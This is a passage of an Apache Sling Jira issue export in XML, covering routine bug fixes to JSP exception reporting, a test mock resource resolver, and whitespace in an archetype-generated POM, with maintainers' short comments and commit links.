                            <resolved>Mon, 9 May 2022 11:25:34 +0000</resolved>
                                    <version>Scripting JSP 2.5.4</version>
                                    <fixVersion>Scripting JSP 2.6.0</fixVersion>
                                    <component>Scripting</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17533665" author="cziegeler" created="Mon, 9 May 2022 07:48:19 +0000"  >&lt;p&gt;Change for &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11300&quot; title=&quot;JSP source/linenumber not shown with precompiled scripts when exception is thrown&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11300&quot;&gt;&lt;del&gt;SLING-11300&lt;/del&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/b4ef34f466c8c6813de989ffd683b100ed3c0c65&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/b4ef34f466c8c6813de989ffd683b100ed3c0c65&lt;/a&gt; contains now code to also call destroy(). But this call is probably too late as it only happens on shutdown&lt;/p&gt;</comment>
                            <comment id="17533759" author="cziegeler" created="Mon, 9 May 2022 11:25:34 +0000"  >&lt;p&gt;Added a catch clause to prevent exceptions on shutdown leaking &lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 24 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z124y0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11300] JSP source/linenumber not shown with precompiled scripts when exception is thrown</title>
                <link>https://issues.apache.org/jira/browse/SLING-11300</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When precompiled (bundled) scripts are used, the JSP source/linenumber is not shown at all when an exception is thrown from within that code (or anything that code is calling)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13443567">SLING-11300</key>
            <summary>JSP source/linenumber not shown with precompiled scripts when exception is thrown</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Fri, 6 May 2022 09:02:48 +0000</created>
                <updated>Sat, 14 May 2022 06:57:55 +0000</updated>
                            <resolved>Mon, 9 May 2022 11:25:52 +0000</resolved>
                                    <version>Scripting JSP 2.5.4</version>
                                    <fixVersion>Scripting JSP 2.6.0</fixVersion>
                                    <component>Scripting</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17533664" author="cziegeler" created="Mon, 9 May 2022 07:47:33 +0000"  >&lt;p&gt;First implementation with &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/b4ef34f466c8c6813de989ffd683b100ed3c0c65&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/b4ef34f466c8c6813de989ffd683b100ed3c0c65&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This change aligns the exception and the servlet handling with non precompiled scripts by using the same code to invoke the servlet and handle the exception.&lt;br/&gt;
If an exception occurs, the JSP is compiled on demand in order to get the source info of the JSP.&lt;/p&gt;</comment>
                            <comment id="17533760" author="cziegeler" created="Mon, 9 May 2022 11:25:52 +0000"  >&lt;p&gt;Resolving for now&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 24 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z124kw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11299] JSP source/linenumber is not always shown when an exception occurs</title>
                <link>https://issues.apache.org/jira/browse/SLING-11299</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;If the JSP engine is just loading an already compiled JSP, all the compiler information is not available. Therefore when an exception occurs, the correct source/line number of the JSP can&apos;t be displayed.&lt;br/&gt;
In addition, the whole handling and wrapping/unwrapping of exceptions looks far too complicated&lt;/p&gt;</description>
                <environment></environment>
        <key id="13443565">SLING-11299</key>
            <summary>JSP source/linenumber is not always shown when an exception occurs</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Fri, 6 May 2022 08:55:16 +0000</created>
                <updated>Sat, 14 May 2022 06:57:59 +0000</updated>
                            <resolved>Fri, 6 May 2022 08:57:55 +0000</resolved>
                                    <version>Scripting JSP 2.5.4</version>
                                    <fixVersion>Scripting JSP 2.6.0</fixVersion>
                                    <component>Scripting</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17532717" author="cziegeler" created="Fri, 6 May 2022 08:57:55 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/0d8ae29e38af946efe555c2da0ef82230efc0656&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/0d8ae29e38af946efe555c2da0ef82230efc0656&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In order to get the compiler information, the JSP is compiled on demand if an exception occurs&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 24 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z124kg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11298] NullPointerException when processing exceptions</title>
                <link>https://issues.apache.org/jira/browse/SLING-11298</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In some cases, when a JSP throws an exception it might happen that actually handling that exception runs into a NPE - which then in turn disables all the logic for exception handling.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13443416">SLING-11298</key>
            <summary>NullPointerException when processing exceptions</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Thu, 5 May 2022 16:07:32 +0000</created>
                <updated>Sat, 14 May 2022 06:58:03 +0000</updated>
                            <resolved>Thu, 5 May 2022 16:09:52 +0000</resolved>
                                    <version>Scripting JSP 2.5.4</version>
                                    <fixVersion>Scripting JSP 2.6.0</fixVersion>
                                    <component>Scripting</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17532391" author="cziegeler" created="Thu, 5 May 2022 16:09:52 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/5c883f7718ef9f60afa0117f658296c703f1b538&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-jsp/commit/5c883f7718ef9f60afa0117f658296c703f1b538&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 24 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z123o0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11297] The org.apache.sling.testing.mock.sling.RRMockResourceResolverWrapper should first query its providers</title>
                <link>https://issues.apache.org/jira/browse/SLING-11297</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When working with &lt;tt&gt;ResourceProviders&lt;/tt&gt; registered in the mocked OSGi framework, the &lt;tt&gt;RRMockResourceResolverWrapper&lt;/tt&gt; implementation queries its bound providers only for some of the methods that perform resource retrieval operations. For the other cases it delegates to the wrapped resource resolver. However, the delegate can be agnostic when it comes to the registered &lt;tt&gt;ResourceProviders&lt;/tt&gt;.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13443400">SLING-11297</key>
            <summary>The org.apache.sling.testing.mock.sling.RRMockResourceResolverWrapper should first query its providers</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Thu, 5 May 2022 14:04:09 +0000</created>
                <updated>Mon, 9 May 2022 08:58:09 +0000</updated>
                            <resolved>Thu, 5 May 2022 16:06:33 +0000</resolved>
                                    <version>Testing Sling Mock 3.2.2</version>
                                    <fixVersion>Testing Sling Mock 3.3.0</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17532258" author="radu.cotescu" created="Thu, 5 May 2022 14:10:04 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt;, see this PR - &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/pull/12&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/pull/12&lt;/a&gt;. I think this should fix the issue. I&apos;ll wait for your review before marking this as resolved.&lt;/p&gt;</comment>
                            <comment id="17532385" author="sseifert@pro-vision.de" created="Thu, 5 May 2022 16:02:23 +0000"  >&lt;p&gt;lgtm, thanks.&lt;/p&gt;

&lt;p&gt;all this is only a workaround solution - in mid or long term we have to add a resource provider implementation in resourceresolver-mock as discussed in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10937&quot; title=&quot;Resource in tested Sling Model not equal to Resource it was adapted from (RESOURCERESOLVER_MOCK)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10937&quot;&gt;&lt;del&gt;SLING-10937&lt;/del&gt;&lt;/a&gt;. but for the next release this fix is fine.&lt;/p&gt;</comment>
                            <comment id="17532389" author="sseifert@pro-vision.de" created="Thu, 5 May 2022 16:06:33 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/9627d024dd0fe858d8411bb1825eb4641dfc4200&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/9627d024dd0fe858d8411bb1825eb4641dfc4200&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17532726" author="radu.cotescu" created="Fri, 6 May 2022 09:10:35 +0000"  >&lt;blockquote&gt;&lt;p&gt;all this is only a workaround solution - in mid or long term we have to add a resource provider implementation in resourceresolver-mock as discussed in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-10937&quot; title=&quot;Resource in tested Sling Model not equal to Resource it was adapted from (RESOURCERESOLVER_MOCK)&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-10937&quot;&gt;&lt;del&gt;SLING-10937&lt;/del&gt;&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;True, but I didn&apos;t know about the other issue and I also wouldn&apos;t have the time for it now. I just wanted to unblock a series of unit tests I&apos;m working on right now and I was surprised to see the difference between how resources are handled when they&apos;re served by providers vs. directly created through the resolver.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13413777">SLING-10937</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 24 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z123kg:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11292] Reactor POM is generated with extra whitespace</title>
                <link>https://issues.apache.org/jira/browse/SLING-11292</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;There is lots of extra whitespace in the reactor when generating  a project with the sling-project-archetype, e.g.&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;  &amp;lt;properties&amp;gt;
                                
    
    
    
    
    
    &amp;lt;sling.host&amp;gt;localhost&amp;lt;/sling.host&amp;gt;
                                
    
    
    
    
    
    &amp;lt;sling.port&amp;gt;8080&amp;lt;/sling.port&amp;gt;
                                
    
    
    
    
    
    &amp;lt;sling.user&amp;gt;admin&amp;lt;/sling.user&amp;gt;
                                
    
    
    
    
    
    &amp;lt;sling.password&amp;gt;admin&amp;lt;/sling.password&amp;gt;&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It does not do any harm but is still distracting and is a bad first impression&lt;/p&gt;</description>
                <environment></environment>
        <key id="13442661">SLING-11292</key>
            <summary>Reactor POM is generated with extra whitespace</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="6">Invalid</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Sat, 30 Apr 2022 21:51:02 +0000</created>
                <updated>Sat, 21 Dec 2024 11:49:32 +0000</updated>
                            <resolved>Fri, 13 Dec 2024 09:28:19 +0000</resolved>
                                                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17530487" author="kwin" created="Sun, 1 May 2022 05:18:45 +0000"  >&lt;p&gt;This is probably caused by &lt;a href=&quot;https://issues.apache.org/jira/browse/ARCHETYPE-584&quot; title=&quot;Resulting root pom.xml from archetype generation has additional newlines with JDK11&quot; class=&quot;issue-link&quot; data-issue-key=&quot;ARCHETYPE-584&quot;&gt;&lt;del&gt;ARCHETYPE-584&lt;/del&gt;&lt;/a&gt;. Workaround: Use archetype plugin 3.1.0 or use Java 8&lt;/p&gt;</comment>
                            <comment id="17905429" author="kwin" created="Fri, 13 Dec 2024 09:28:00 +0000"  >&lt;p&gt;This issue is fixed in Archetype Plugin 3.3.0 (&lt;a href=&quot;https://issues.apache.org/jira/browse/ARCHETYPE-637&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/ARCHETYPE-637&lt;/a&gt;). Nothing to do on the Sling site (except for maybe a hint in the readme).&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            44 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z11z0g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>
</channel>
</rss>